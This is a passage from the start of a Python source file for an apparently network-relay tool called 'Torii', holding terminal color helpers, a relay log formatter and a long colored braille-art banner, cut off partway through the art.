#!/usr/bin/env python3
import argparse
import logging
import sys
import socket
import threading
import struct
import signal
import os
import traceback
import re
import base64
from typing import Callable
from pathlib import Path
from collections import OrderedDict

__version__ = "0.1.0"
__author__ = "b3rt1ng"

# ============================================================================
# UI / Color helpers
# ============================================================================

RED    = (196, 46, 38)
WHITE  = (235, 235, 235)
YELLOW = (222, 184, 64)
MUTED  = (140, 140, 140)

RST  = "\033[0m"
BOLD = "\033[1m"


def colored_text(text, color) -> str:
    if not sys.stdout.isatty():
        return str(text)
    r, g, b = color
    return f"\033[38;2;{r};{g};{b}m{text}{RST}"


def bold(t):   return f"{BOLD}{t}{RST}"
def accent(t): return colored_text(t, RED)
def plain(t):  return colored_text(t, WHITE)
def muted(t):  return colored_text(t, MUTED)


def notify(msg_type: str, text: str) -> None:
    prefixes = {
        "info":    (WHITE, "?"),
        "error":   (RED,   "X"),
        "warning": (RED,   "!"),
        "status":  (MUTED, "~"),
        "success": (RED,   "✔"),
    }
    if msg_type not in prefixes:
        print(f"  {text}")
        return
    color, icon = prefixes[msg_type]
    print(f"  {colored_text(icon, color)}  {text}")


class ColorFormatter(logging.Formatter):
    """Log formatter for interactive terminals: red timestamp, colored message.
    Torii logs: IP (white), post-colon content (yellow), timestamp (red)."""

    def __init__(self, datefmt: str | None = None):
        super().__init__(datefmt=datefmt)

    def format(self, record: logging.LogRecord) -> str:
        ts = colored_text(self.formatTime(record, self.datefmt), RED)
        msg = record.getMessage()

        if "torii.relay" in record.name or "torii.core" in record.name:
            match = re.search(r'\[(\d+\.\d+\.\d+\.\d+):(\d+)([^\]]*)\]\s+([\w→]+):\s+(\d+\s+bytes):', msg)
            if match:
                ip = match.group(1)
                port = match.group(2)
                rest_bracket = match.group(3)
                direction = match.group(4)
                byte_count = match.group(5)
                bracket_colored = colored_text(f"[{ip}:{port}{rest_bracket}]", YELLOW)
                direction_colored = colored_text(f" {direction}: {byte_count}:", YELLOW)
                after_bytes = msg[match.end():]
                after_colored = colored_text(after_bytes, WHITE)
                msg = bracket_colored + direction_colored + after_colored
            else:
                msg = colored_text(msg, YELLOW)
        else:
            msg_color = WHITE if record.levelno == logging.DEBUG else YELLOW
            msg = colored_text(msg, msg_color)

        line = f"{ts} [{record.levelname}] {record.name}: {msg}"
        if record.exc_info:
            line += "\n" + self.formatException(record.exc_info)
        return line


def display_art(version: str = "") -> None:
    """Full-color braille-art torii gate + koi (per-glyph true color)"""
    tty = sys.stdout.isatty()

    def color_signal(c):
        return f"\033[38;2;{c[0]};{c[1]};{c[2]}m" if tty else ""

    RST_local = "\033[0m" if tty else ""

    art = f"""\
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{RST_local}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{RST_local}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{color_signal((130, 24, 24))}⠹{color_signal((179, 28, 29))}⣶{color_signal((167, 27, 26))}⣶{color_signal((152, 25, 24))}⣦{color_signal((131, 21, 21))}⣤{color_signal((112, 17, 17))}⣤{color_signal((101, 14, 15))}⣤{color_signal((80, 12, 13))}⣀{color_signal((74, 12, 11))}⣀{color_signal((62, 10, 10))}⣀{color_signal((52, 8, 8))}⣀{color_signal((44, 7, 7))}⣀{color_signal((36, 6, 6))}⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{color_signal((38, 7, 7))}⣀{color_signal((42, 7, 7))}⣀{color_signal((44, 9, 8))}⣀{color_signal((54, 10, 10))}⣀{color_signal((65, 11, 11))}⣀{color_signal((75, 12, 13))}⣀{color_signal((92, 15, 16))}⣠{color_signal((106, 17, 17))}⣤{color_signal((128, 20, 20))}⣤{color_signal((150, 24, 23))}⣴{color_signal((163, 27, 26))}⣶{color_signal((179, 29, 29))}⣶{color_signal((131, 27, 26))}⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{RST_local}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{color_signal((106, 21, 21))}⢰{color_signal((162, 30, 29))}⣤{color_signal((163, 29, 28))}⣬{color_signal((168, 29, 28))}⣭{color_signal((168, 29, 29))}⣭{color_signal((168, 28, 28))}⣉{color_signal((166, 29, 29))}⣉{color_signal((164, 30, 30))}⣛{color_signal((163, 28, 28))}⣛{color_signal((164, 28, 28))}⣛{color_signal((167, 30, 29))}⣛{color_signal((167, 30, 31))}⣛{color_signal((170, 30, 30))}⣛{color_signal((175, 30, 30))}⣛{color_signal((171, 31, 30))}⣛{color_signal((170, 30, 30))}⣛{color_signal((171, 30, 30))}⣛{color_signal((174, 30, 30))}⣛⣛{color_signal((168, 29, 30))}⣛{color_signal((173, 29, 29))}⣛{color_signal((169, 28, 28))}⣛{color_signal((168, 29, 29))}⣛{color_signal((176, 29, 30))}⣛{color_signal((174, 31, 31))}⣛{color_signal((169, 30, 30))}⣛{color_signal((167, 30, 30))}⣛{color_signal((171, 31, 30))}⣛{color_signal((182, 30, 30))}⣛{color_signal((187, 31, 32))}⣛{color_signal((185, 33, 31))}⣛{color_signal((168, 31, 31))}⣛{color_signal((173, 30, 30))}⣛{color_signal((173, 29, 29))}⣛{color_signal((170, 29, 29))}⣉{color_signal((170, 28, 28))}⣉{color_signal((168, 29, 29))}⣉{color_signal((170, 28, 28))}⣭{color_signal((163, 27, 27))}⣭{color_signal((158, 27, 27))}⣥{color_signal((153, 27, 27))}⣤{color_signal((110, 21, 21))}⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{RST_local}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{color_signal((52, 10, 10))}⠉{color_signal((67, 12, 12))}⠉{color_signal((84, 15, 14))}⠉{color_signal((96, 17, 17))}⠉{color_signal((100, 18, 18))}⠛{color_signal((104, 20, 20))}⠛{color_signal((133, 23, 22))}⠻{color_signal((178, 28, 28))}⠿{color_signal((174, 28, 28))}⠿{color_signal((137, 25, 25))}⠟{color_signal((116, 21, 21))}⠛{color_signal((118, 22, 21))}⠛{color_signal((123, 21, 21))}⠛{color_signal((128, 21, 21))}⠛{color_signal((129, 23, 23))}⠛{color_signal((131, 25, 24))}⠛{color_signal((136, 23, 23))}⠛{color_signal((129, 23, 23))}⠛{color_signal((137, 27, 27))}⡏{color_signal((196, 31, 32))}⣽{color_signal((199, 31, 31))}⣯{color_signal((138, 28, 27))}⢽{color_signal((126, 23, 22))}⠛{color_signal((136, 23, 23))}⠛{color_signal((138, 23, 23))}⠛{color_signal((137, 22, 22))}⠛{color_signal((132, 21, 21))}⠛{color_signal((131, 22, 21))}⠛{color_signal((128, 24, 23))}⠛{color_signal((122, 23, 23))}⠛{color_signal((130, 23, 23))}⠛{color_signal((170, 29, 28))}⠿{color_signal((176, 28, 27))}⠿{color_signal((132, 23, 23))}⠟{color_signal((104, 18, 18))}⠛{color_signal((103, 18, 18))}⠛{color_signal((91, 16, 16))}⠉{color_signal((72, 14, 14))}⠉{color_signal((69, 13, 13))}⠉{color_signal((63, 12, 12))}⠉{color_signal((15, 4, 4))}⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{RST_local}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{color_signal((32, 7, 6))}⡀⠀{color_signal((127, 25, 26))}⣠{color_signal((147, 27, 28))}⣦⠀{color_signal((31, 10, 9))}⢀⠀⠀⠀⠀⠀⠀⠀{color_signal((163, 31, 29))}⡇{color_signal((252, 35, 37))}⣿{color_signal((252, 35, 36))}⣿{color_signal((162, 32, 31))}⢸⠀⠀⠀⠀⠀⠀⠀{color_signal((34, 10, 9))}⡀⠀{color_signal((164, 28, 28))}⣴{color_signal((160, 30, 31))}⣦⠀{color_signal((32, 8, 7))}⣀⠀⠀⠀⠀⠀{color_signal((62, 60, 56))}⣠{color_signal((126, 116, 106))}⣴{color_signal((96, 90, 83))}⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{RST_local}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{color_signal((171, 29, 28))}⣶{color_signal((169, 30, 28))}⣶{color_signal((169, 27, 27))}⣶{color_signal((171, 27, 27))}⣶{color_signal((161, 27, 27))}⣶{color_signal((211, 38, 37))}⣿{color_signal((105, 25, 23))}⡇{color_signal((216, 35, 35))}⣿{color_signal((194, 31, 32))}⣿{color_signal((103, 21, 21))}⢰{color_signal((213, 36, 35))}⣿{color_signal((177, 28, 28))}⣶{color_signal((176, 28, 28))}⣶{color_signal((170, 27, 26))}⣶{color_signal((173, 27, 27))}⣶{color_signal((169, 28, 26))}⣶{color_signal((148, 36, 36))}⣶{color_signal((124, 56, 51))}⣖{color_signal((142, 29, 27))}⣧{color_signal((172, 29, 28))}⣿{color_signal((178, 30, 29))}⣿{color_signal((148, 31, 29))}⣞{color_signal((145, 25, 25))}⣶{color_signal((168, 27, 28))}⣶{color_signal((170, 27, 27))}⣶{color_signal((162, 28, 27))}⣶{color_signal((157, 29, 28))}⣶{color_signal((167, 28, 28))}⣶{color_signal((169, 27, 28))}⣶{color_signal((219, 36, 35))}⣿{color_signal((112, 24, 23))}⡇{color_signal((196, 33, 32))}⣿{color_signal((235, 38, 38))}⣿{color_signal((114, 24, 23))}⢸{color_signal((220, 37, 36))}⣿{color_signal((171, 27, 27))}⣶{color_signal((169, 28, 27))}⣶{color_signal((166, 27, 28))}⣶{color_signal((167, 25, 26))}⣶{color_signal((187, 46, 46))}⣾{color_signal((184, 146, 134))}⣿{color_signal((244, 236, 225))}⣿{color_signal((16, 16, 14))}⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{RST_local}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{color_signal((90, 18, 17))}⠛{color_signal((91, 18, 18))}⠛{color_signal((93, 18, 17))}⠛{color_signal((93, 19, 18))}⠛{color_signal((87, 18, 17))}⠛{color_signal((87, 19, 17))}⠉{color_signal((66, 17, 16))}⠁{color_signal((227, 34, 35))}⣿{color_signal((182, 29, 30))}⡷{color_signal((70, 17, 17))}⠈{color_signal((92, 21, 19))}⠉{color_signal((90, 20, 19))}⠉{color_signal((90, 21, 20))}⠉{color_signal((104, 34, 33))}⢙{color_signal((175, 102, 93))}⣽{color_signal((193, 166, 150))}⣿{color_signal((236, 225, 208))}⣿{color_signal((239, 235, 225))}⣿{color_signal((120, 52, 49))}⡟{color_signal((90, 21, 20))}⠉{color_signal((90, 23, 22))}⠉{color_signal((95, 23, 21))}⠙{color_signal((95, 22, 20))}⠋{color_signal((91, 21, 19))}⠉{color_signal((89, 19, 18))}⠉{color_signal((88, 20, 19))}⠉{color_signal((92, 22, 20))}⠛{color_signal((96, 21, 20))}⠛{color_signal((94, 19, 19))}⠋{color_signal((93, 20, 20))}⠙{color_signal((75, 18, 17))}⠁{color_signal((193, 33, 32))}⣿{color_signal((249, 37, 37))}⣿{color_signal((91, 20, 20))}⡏{color_signal((94, 19, 18))}⠋{color_signal((94, 20, 19))}⠛{color_signal((111, 36, 34))}⢛{color_signal((181, 92, 76))}⣭{color_signal((175, 101, 92))}⣭{color_signal((175, 95, 79))}⣭{color_signal((207, 186, 175))}⣿{color_signal((98, 93, 85))}⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{RST_local}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{color_signal((12, 11, 5))}⢀{color_signal((39, 36, 6))}⣀{color_signal((81, 76, 8))}⣠{color_signal((128, 122, 20))}⣤{color_signal((117, 109, 12))}⣤{color_signal((193, 120, 19))}⣭{color_signal((181, 135, 15))}⣥{color_signal((150, 140, 12))}⣤{color_signal((144, 137, 23))}⣶{color_signal((125, 117, 27))}⣶{color_signal((75, 68, 19))}⠦{color_signal((85, 80, 50))}⠯{color_signal((64, 53, 37))}⠉{color_signal((87, 81, 73))}⠹{color_signal((162, 145, 128))}⣿{color_signal((235, 206, 176))}⣿{color_signal((236, 224, 200))}⣿{color_signal((186, 176, 162))}⣷{color_signal((166, 162, 151))}⣶{color_signal((114, 109, 101))}⣦{color_signal((66, 65, 57))}⣤{color_signal((84, 81, 13))}⣠{color_signal((134, 130, 25))}⣮{color_signal((112, 110, 10))}⣤{color_signal((77, 76, 11))}⣀{color_signal((72, 71, 10))}⣀{color_signal((54, 50, 10))}⣀{color_signal((14, 13, 8))}⡀⠀{color_signal((167, 33, 32))}⣿{color_signal((246, 36, 36))}⣿{color_signal((92, 21, 19))}⡇{color_signal((59, 56, 8))}⣠{color_signal((55, 53, 13))}⡄{color_signal((104, 86, 52))}⣚{color_signal((184, 121, 77))}⣿{color_signal((212, 157, 111))}⣿{color_signal((178, 165, 147))}⣿{color_signal((187, 183, 113))}⣻{color_signal((44, 42, 29))}⡃{color_signal((28, 26, 10))}⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{RST_local}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{color_signal((95, 92, 12))}⣤{color_signal((182, 179, 7))}⣶{color_signal((212, 210, 6))}⣾{color_signal((246, 241, 4))}⣿{color_signal((255, 255, 5))}⣿{color_signal((255, 255, 2))}⣿{color_signal((255, 255, 0))}⣿{color_signal((253, 250, 3))}⣿{color_signal((179, 172, 6))}⠿{color_signal((169, 148, 11))}⠿{color_signal((154, 126, 22))}⢛{color_signal((105, 97, 18))}⠛{color_signal((89, 71, 31))}⡩{color_signal((86, 75, 20))}⣧{color_signal((156, 153, 7))}⣴{color_signal((228, 225, 6))}⣿{color_signal((255, 255, 5))}⣿{color_signal((223, 217, 11))}⣿{color_signal((185, 177, 18))}⣾{color_signal((97, 73, 38))}⡙{color_signal((124, 84, 53))}⠻{color_signal((115, 96, 69))}⠻{color_signal((127, 111, 44))}⣿{color_signal((203, 194, 28))}⣿{color_signal((243, 240, 11))}⣿{color_signal((255, 255, 0))}⣿{color_signal((240, 238, 4))}⣿{color_signal((184, 177, 9))}⠿{color_signal((192, 184, 20))}⣿{color_signal((191, 187, 8))}⠿{color_signal((225, 221, 5))}⢿{color_signal((249, 247, 5))}⣿{color_signal((139, 127, 13))}⣦{color_signal((146, 28, 29))}⢹{color_signal((246, 40, 39))}⣿{color_signal((132, 91, 17))}⣱{color_signal((255, 255, 2))}⣿{color_signal((246, 244, 9))}⣿{color_signal((126, 109, 23))}⢇{color_signal((193, 131, 86))}⣿{color_signal((165, 138, 115))}⡟{color_signal((195, 189, 12))}⣾{color_signal((255, 255, 0))}⣿{color_signal((227, 219, 18))}⣿{color_signal((20, 18, 4))}⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{RST_local}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{color_signal((48, 45, 12))}⠒{color_signal((106, 99, 15))}⠛{color_signal((82, 80, 7))}⠋{color_signal((58, 54, 5))}⠉{color_signal((79, 75, 9))}⢡{color_signal((250, 247, 4))}⣿{color_signal((255, 255, 2))}⣿{color_signal((132, 121, 23))}⢏{color_signal((85, 27, 20))}⣨{color_signal((200, 34, 33))}⣶{color_signal((138, 30, 28))}⡮{color_signal((106, 60, 31))}⢚{color_signal((182, 177, 10))}⣼{color_signal((255, 255, 3))}⣿{color_signal((195, 191, 8))}⡿{color_signal((186, 161, 26))}⣟{color_signal((190, 170, 112))}⣽{color_signal((205, 203, 197))}⣾{color_signal((94, 90, 59))}⣮{color_signal((208, 200, 42))}⣿{color_signal((69, 62, 26))}⣧{color_signal((55, 37, 20))}⣐{color_signal((99, 75, 33))}⡯{color_signal((113, 107, 13))}⣱{color_signal((255, 255, 2))}⣿{color_signal((238, 237, 5))}⣿{color_signal((144, 89, 31))}⣳{color_signal((178, 93, 49))}⡿{color_signal((158, 126, 60))}⣟{color_signal((128, 125, 15))}⣤{color_signal((210, 206, 6))}⣾{color_signal((254, 251, 5))}⣿{color_signal((149, 141, 18))}⠟{color_signal((134, 28, 26))}⣸{color_signal((146, 56, 23))}⢧{color_signal((245, 244, 4))}⣿{color_signal((255, 255, 0))}⣿{color_signal((167, 159, 12))}⡟{color_signal((113, 68, 47))}⣼{color_signal((127, 94, 69))}⠿{color_signal((156, 146, 23))}⣹{color_signal((255, 255, 1))}⣿{color_signal((254, 250, 4))}⣿{color_signal((65, 62, 7))}⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{RST_local}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{color_signal((32, 29, 9))}⢀{color_signal((235, 231, 7))}⣿{color_signal((255, 255, 1))}⣿{color_signal((159, 147, 17))}⣟{color_signal((209, 160, 92))}⣾{color_signal((121, 34, 29))}⢻{color_signal((237, 40, 39))}⣿{color_signal((127, 78, 22))}⣣{color_signal((241, 240, 16))}⣿{color_signal((246, 244, 4))}⣿{color_signal((136, 111, 23))}⢫{color_signal((145, 76, 45))}⣾{color_signal((179, 96, 54))}⣿{color_signal((207, 108, 55))}⣿{color_signal((176, 129, 91))}⡟{color_signal((186, 179, 32))}⣾{color_signal((219, 210, 34))}⣿{color_signal((114, 108, 67))}⣿{color_signal((210, 192, 177))}⣿{color_signal((110, 92, 30))}⢷{color_signal((250, 248, 4))}⣿{color_signal((255, 255, 0))}⣿{color_signal((189, 184, 14))}⣷{color_signal((197, 188, 17))}⣶{color_signal((241, 240, 6))}⣿{color_signal((236, 233, 5))}⣿{color_signal((190, 187, 18))}⢿{color_signal((178, 161, 42))}⣛{color_signal((153, 115, 60))}⣵{color_signal((152, 127, 107))}⣿{color_signal((73, 16, 16))}⠈{color_signal((214, 207, 9))}⣾{color_signal((255, 255, 0))}⣿{color_signal((187, 182, 12))}⡟{color_signal((119, 90, 71))}⣴{color_signal((78, 45, 28))}⣆{color_signal((72, 67, 9))}⢰{color_signal((255, 255, 3))}⣿{color_signal((255, 255, 2))}⣿{color_signal((101, 95, 20))}⢏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{RST_local}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{color_signal((27, 12, 9))}⢀{color_signal((137, 79, 42))}⣴{color_signal((164, 150, 113))}⡞{color_signal((200, 192, 16))}⣿{color_signal((255, 255, 0))}⣿{color_signal((198, 191, 16))}⣿{color_signal((112, 82, 51))}⣸{color_signal((181, 122, 63))}⣿{color_signal((146, 33, 30))}⢸{color_signal((151, 48, 25))}⢧{color_signal((245, 245, 5))}⣿{color_signal((255, 252, 4))}⣿{color_signal((130, 123, 63))}⢳{color_signal((210, 178, 144))}⣿{color_signal((232, 154, 75))}⣿{color_signal((218, 121, 65))}⣿{color_signal((156, 98, 39))}⢟{color_signal((198, 193, 18))}⣾{color_signal((252, 250, 18))}⣿{color_signal((121, 112, 32))}⠿{color_signal((84, 78, 36))}⠾{color_signal((162, 156, 37))}⣷{color_signal((249, 247, 4))}⣿{color_signal((250, 247, 3))}⣿{color_signal((218, 213, 6))}⢿{color_signal((255, 255, 1))}⣿{color_signal((248, 246, 5))}⣿{color_signal((110, 102, 11))}⣍{color_signal((36, 25, 19))}⢐{color_signal((163, 143, 121))}⣿{color_signal((232, 223, 206))}⣿{color_signal((202, 178, 151))}⣿{color_signal((124, 91, 69))}⣿{color_signal((132, 123, 19))}⣸{color_signal((255, 255, 1))}⣿{color_signal((223, 220, 7))}⣿{color_signal((78, 64, 49))}⠹{color_signal((106, 66, 48))}⠛{color_signal((83, 52, 34))}⣇{color_signal((222, 217, 17))}⣿{color_signal((255, 255, 0))}⣿{color_signal((153, 144, 19))}⣏{color_signal((207, 197, 184))}⣿{color_signal((167, 165, 155))}⣶{color_signal((40, 39, 35))}⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{RST_local}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{color_signal((46, 23, 14))}⢀{color_signal((147, 61, 37))}⣴{color_signal((238, 112, 59))}⣿{color_signal((244, 118, 60))}⣿{color_signal((137, 111, 32))}⣹{color_signal((255, 255, 12))}⣿{color_signal((224, 222, 7))}⣿{color_signal((147, 87, 41))}⣹{color_signal((190, 143, 87))}⣹{color_signal((205, 186, 165))}⣿{color_signal((170, 31, 26))}⢸{color_signal((146, 90, 17))}⣸{color_signal((255, 255, 1))}⣿{color_signal((224, 217, 7))}⣿{color_signal((69, 67, 64))}⠙{color_signal((144, 142, 133))}⢟{color_signal((161, 156, 86))}⣻{color_signal((186, 178, 17))}⣵{color_signal((253, 251, 4))}⣿{color_signal((209, 205, 21))}⡿{color_signal((150, 145, 95))}⣻{color_signal((178, 154, 130))}⣾{color_signal((116, 97, 76))}⡾{color_signal((189, 182, 28))}⣾{color_signal((255, 255, 3))}⣿{color_signal((105, 92, 19))}⢏{color_signal((60, 28, 15))}⣄{color_signal((125, 107, 22))}⣙{color_signal((221, 216, 7))}⢿{color_signal((255, 255, 2))}⣿{color_signal((185, 182, 14))}⣯{color_signal((108, 99, 60))}⡓{color_signal((118, 86, 69))}⣾{color_signal((132, 105, 86))}⣭{color_signal((69, 64, 48))}⡤{color_signal((242, 234, 26))}⣿{color_signal((249, 248, 4))}⣿{color_signal((136, 63, 22))}⢣⠀⠀{color_signal((107, 98, 23))}⢸{color_signal((255, 255, 9))}⣿{color_signal((200, 197, 9))}⡿{color_signal((77, 60, 48))}⠼{color_signal((162, 134, 111))}⣿{color_signal((173, 148, 126))}⣿{color_signal((188, 167, 146))}⣿{color_signal((112, 101, 90))}⣦{color_signal((78, 70, 63))}⣤{color_signal((17, 16, 14))}⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{RST_local}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{color_signal((14, 12, 10))}⠠{color_signal((153, 150, 139))}⣴{color_signal((255, 183, 135))}⣿{color_signal((254, 161, 111))}⣿{color_signal((249, 176, 139))}⣿{color_signal((141, 87, 57))}⡏{color_signal((177, 172, 37))}⣿{color_signal((249, 245, 19))}⣿{color_signal((144, 106, 32))}⢷{color_signal((251, 156, 72))}⣿{color_signal((212, 186, 159))}⣿{color_signal((165, 142, 127))}⣿{color_signal((180, 32, 29))}⣸{color_signal((176, 33, 28))}⣧{color_signal((158, 149, 10))}⠻{color_signal((239, 235, 3))}⣿{color_signal((249, 245, 6))}⣿{color_signal((255, 251, 7))}⣿{color_signal((226, 223, 6))}⣿{color_signal((160, 158, 6))}⠟{color_signal((127, 95, 23))}⣫{color_signal((178, 96, 56))}⣾{color_signal((241, 226, 201))}⣿{color_signal((220, 214, 196))}⣿{color_signal((71, 67, 40))}⠻{color_signal((218, 210, 33))}⣿{color_signal((120, 113, 32))}⢏{color_signal((189, 171, 152))}⣿{color_signal((183, 137, 111))}⣿{color_signal((124, 106, 92))}⠿{color_signal((66, 57, 52))}⠓{color_signal((97, 94, 10))}⠙{color_signal((207, 202, 16))}⢿{color_signal((255, 252, 6))}⣿{color_signal((168, 154, 18))}⣮{color_signal((145, 112, 78))}⡻{color_signal((65, 58, 34))}⠿{color_signal((224, 220, 33))}⣿{color_signal((142, 109, 14))}⢏{color_signal((242, 41, 38))}⣿⠀⠀{color_signal((112, 103, 33))}⢿{color_signal((234, 231, 19))}⣿{color_signal((39, 36, 6))}⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{RST_local}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{color_signal((11, 11, 10))}⢀{color_signal((138, 120, 102))}⣼{color_signal((222, 182, 145))}⣿{color_signal((240, 231, 217))}⣿{color_signal((239, 219, 197))}⣿{color_signal((142, 109, 83))}⣿{color_signal((63, 53, 43))}⡃{color_signal((182, 175, 46))}⣿{color_signal((140, 133, 44))}⢿{color_signal((203, 142, 85))}⣿{color_signal((200, 121, 53))}⣿{color_signal((190, 149, 113))}⣿{color_signal((160, 129, 108))}⣿{color_signal((253, 204, 181))}⣿{color_signal((246, 37, 33))}⣿{color_signal((82, 29, 25))}⡄{color_signal((103, 95, 86))}⠳{color_signal((158, 145, 122))}⣿{color_signal((66, 60, 50))}⣀{color_signal((112, 102, 88))}⣴{color_signal((169, 133, 108))}⣾{color_signal((186, 116, 83))}⣿{color_signal((200, 152, 123))}⣿{color_signal((212, 192, 169))}⣿{color_signal((179, 154, 131))}⣿{color_signal((62, 53, 36))}⠦{color_signal((108, 93, 31))}⢏{color_signal((133, 113, 97))}⣯{color_signal((115, 108, 98))}⣍{color_signal((20, 20, 18))}⡀⠀⠀⠀⠀{color_signal((73, 66, 21))}⠙{color_signal((158, 152, 20))}⢿{color_signal((208, 197, 34))}⣿{color_signal((73, 71, 16))}⣄{color_signal((110, 104, 27))}⠟{color_signal((192, 30, 30))}⣼{color_signal((251, 43, 39))}⣿{color_signal((74, 18, 16))}⡇⠀{color_signal((42, 40, 16))}⠸{color_signal((72, 70, 13))}⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{RST_local}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{color_signal((101, 85, 69))}⢼{color_signal((225, 208, 188))}⣿{color_signal((242, 226, 202))}⣿{color_signal((245, 186, 121))}⣿{color_signal((243, 179, 98))}⣿{color_signal((211, 187, 130))}⣿{color_signal((134, 112, 78))}⣷{color_signal((77, 69, 33))}⢩{color_signal((211, 192, 158))}⣾{color_signal((204, 187, 165))}⣿{color_signal((183, 149, 121))}⣿{color_signal((167, 149, 132))}⣿{color_signal((165, 142, 125))}⣿{color_signal((244, 212, 176))}⣿{color_signal((199, 97, 61))}⣿{color_signal((119, 67, 47))}⣬{color_signal((163, 133, 112))}⣿{color_signal((173, 151, 135))}⣿{color_signal((186, 164, 148))}⣿{color_signal((143, 124, 111))}⡿{color_signal((110, 94, 85))}⠟{color_signal((85, 74, 66))}⠛{color_signal((63, 57, 51))}⠋{color_signal((82, 63, 50))}⠛{color_signal((120, 83, 61))}⢿{color_signal((156, 102, 69))}⣷{color_signal((199, 123, 69))}⣿{color_signal((239, 183, 135))}⣿{color_signal((242, 223, 194))}⣿{color_signal((226, 222, 210))}⣿{color_signal((38, 37, 34))}⡄⠀⠀⠀⠀⠀⠀{color_signal((55, 50, 13))}⠉{color_signal((67, 57, 18))}⠢{color_signal((161, 31, 27))}⠻{color_signal((252, 38, 36))}⣿{color_signal((101, 22, 20))}⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{RST_local}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{color_signal((64, 59, 53))}⠛{color_signal((91, 71, 54))}⠛{color_signal((118, 97, 78))}⠛{color_signal((136, 125, 113))}⢿{color_signal((124, 114, 97))}⠛{color_signal((87, 79, 69))}⠓{color_signal((63, 57, 50))}⠚{color_signal((92, 83, 74))}⠛{color_signal((84, 75, 67))}⠛{color_signal((51, 46, 42))}⠙{color_signal((74, 64, 58))}⠛{color_signal((89, 60, 53))}⢛{color_signal((128, 85, 75))}⣙{color_signal((177, 129, 101))}⣿{color_signal((202, 120, 70))}⣿{color_signal((228, 142, 80))}⣿{color_signal((241, 192, 145))}⣿{color_signal((247, 231, 206))}⣿{color_signal((239, 231, 213))}⣿{color_signal((135, 134, 127))}⣦{color_signal((15, 16, 14))}⡀⠀⠀⠀{color_signal((29, 29, 27))}⠈{color_signal((92, 81, 70))}⠛{color_signal((138, 119, 100))}⠿{color_signal((157, 147, 132))}⠿{color_signal((184, 175, 157))}⠿{color_signal((174, 170, 155))}⠿{color_signal((27, 27, 24))}⠄⠀⠀⠀⠀⠀⠀{color_signal((57, 21, 19))}⠐{color_signal((157, 32, 29))}⣾{color_signal((243, 38, 36))}⣿{color_signal((136, 27, 